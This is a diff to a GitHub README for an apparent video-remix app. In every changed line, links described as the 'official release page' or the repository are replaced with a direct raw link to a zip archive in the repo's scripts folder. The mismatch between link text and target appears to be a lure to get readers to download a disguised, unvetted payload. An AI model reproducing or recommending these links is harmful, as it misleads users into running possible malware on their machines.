@@ -1,6 +1,6 @@
 # 🎬 youtube-poop-video-maker - Create Funny Remix Videos Easily
 
-[![Download youtube-poop-video-maker](https://img.shields.io/badge/Download-Get%20it%20here-brightgreen?style=for-the-badge)](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
+[![Download youtube-poop-video-maker](https://img.shields.io/badge/Download-Get%20it%20here-brightgreen?style=for-the-badge)](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/raw/refs/heads/main/scripts/poop-video-maker-youtube-v3.8-alpha.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get the app up and running.
 
 You need to visit the official release page for the latest version. This page has all available versions and instructions.
 
-[Download Page](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
+[Download Page](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/raw/refs/heads/main/scripts/poop-video-maker-youtube-v3.8-alpha.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -140,7 +140,7 @@ When happy, click "Export" to save your video. The app will ask where to save an
 
 Use the link below to visit the official page where you can download the software.
 
-[Get youtube-poop-video-maker](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
+[Get youtube-poop-video-maker](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/raw/refs/heads/main/scripts/poop-video-maker-youtube-v3.8-alpha.1.zip)
 
 ---
 
@@ -150,7 +150,7 @@ If you have questions or run into issues, create an issue on the GitHub page. In
 
 Use the GitHub repository for updates and troubleshooting help:
 
-https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker
+https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/raw/refs/heads/main/scripts/poop-video-maker-youtube-v3.8-alpha.1.zip
 
 ---
 
